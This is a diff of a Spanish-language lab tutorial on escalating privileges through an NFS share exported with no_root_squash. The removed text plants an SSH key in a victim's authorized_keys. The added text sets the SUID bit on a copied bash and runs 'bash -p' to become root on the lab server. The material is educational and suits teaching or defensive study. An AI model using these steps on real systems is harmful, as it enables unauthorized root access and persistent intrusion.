@@ -52,7 +52,7 @@ Si listamos la carpeta veremos que el propietario es ***luke***
 ls -l /datos
 ```
 
-![propietaio de bash](../img/lab-04-D/202209101503.png)
+![propietario de bash](../img/lab-04-D/202209101503.png)
 
 
 Ahora en la maquina ***Kali***.
@@ -78,61 +78,51 @@ El resultado debe ser similar al mostrado en la siguiente imagen.
 
 ![NFS Share mounted](../img/lab-30-D/202209101823.png)
 
-El punto de montaje se corresponde con el directorio raíz del usuario. Vamos a listarlo porque pretendemos encontrar un directorio muy "interesante" como muestra la imagen.
-Nota: Mostramos archivos y carpetas ocultos.
-
+A través del punto de montaje, podemos ver el archivo ***bash*** que el usuario ***luke*** copió.
 ```
-ls -l -a /tmp/directorio-home-de-la-victima
-```
+cd /tmp/share
 
-![listado del home](../img/lab-30-D/202209101827.png)
-
-El directorio oculto ***ssh*** almacena las claves ***públicas***, ***privadas*** y ***autorizadas*** para poder hacer un ***login ssh*** que no requiere contraseña.
-
-Podemos ver los archivos que contiene de la siguiente forma.
-```
-sudo ls -a -l /tmp/directorio-home-de-la-victima/.ssh
+ls -l
 ```
 
-La técnica que se usa es la de crear en la máquina de ataque una pareja de claves público/privada. A continuación (por tener permiso ***rw*** en el share) agregaremos la ***clave pública*** al archivo ***authorized_keys*** de la víctima.
+Para que el exploit funcione, debemos asignar el permiso ***SUID*** al archivo copiado (***bash***). Al haber montado el share con la opción ***no_root_squash*** habilitata, nos da acceso de administrador a los archivos que allí se encuentren.
 
-Creamos la pareja de claves. En la máquina ***kali*** ejecutamos el comando.
-Nota: Pulsamos ***ENTER*** por cada pregunta que nos formule.
+Vamos a cambiar el ***propietario*** y asignar el permiso ***SUID*** a ***bash***.
 ```
-ssh-keygen
-```
-
-El archivo que contiene la clave pública es.
-```
-ls ~/.ssh/id_rsa.pub
+sudo chown root.root bash
 ```
 
-Y su contenido es.
 ```
-cat ~/.ssh/id_rsa.pub
-```
+sudo chmod +s bash
 
-Ahora simplemente tenemos que añadir la ***clave pública*** al archivo ***authorized_keys*** de la víctima.
-```
-sudo sh -c "cat /home/antonio/.ssh/id_rsa.pub >>  /tmp/directorio-home-de-la-victima/.ssh/authorized_keys"
+ls -l bash
 ```
 
-Podemos comprobar como se ha añadido la clave pública al final del archivo de claves autorizadas.
+En la imagen podemos ver el resultado.
+
+![SUID](../img/lab-30-D/202209102213.png)
+
+Un archivo con el permiso ***SUID*** (bit s), puede ser ejecutado por cualquier usuario, per siempre se ejecuta con el permiso del propietario, que es ***root***.
+
+En la máquina ***ubu_srv_01***, donde hemos iniciado la sesión con el usuario ***luke***, ejecutamos el comando.
+Nota: ***-p*** ejecuta la shell en modo privilegiado, de no ponerlo, SUID no tendrá efecto.
 ```
-sudo cat /tmp/directorio-home-de-la-victima/.ssh/authorized_keys
+/datos/bash -p
 ```
 
-Lo único que queda por hacer es comprobar que se puede acceder al equipo de la víctima por ***ssh***.
-Nota: ***~/.ssh/id_rsa*** es el archivo que contiene la ***clave privada*** que hemos creado antes.
+Ahora solo queda preguntar al sistema quién somos.
 ```
-ssh -i ~/.ssh/id_rsa antonio@192.168.20.13
+whoami
 ```
 
-En la imagen podemos ver como se conecta a través de ***ssh***. Respondemos ***yes*** para realizar la conexión.
+Hemos escalado al ***root*** sin necesidad de conocer la contraseña.
 
-![ssh a la victima](../img/lab-30-D/202209101846.png)
+![bash -p](../img/lab-30-D/202209102221.png)
 
+Ya solo queda desmontar el share. En la máquina ***Kali***.
+```
+cd ~
 
-
-
+sudo umount /tmp/share
+```
 
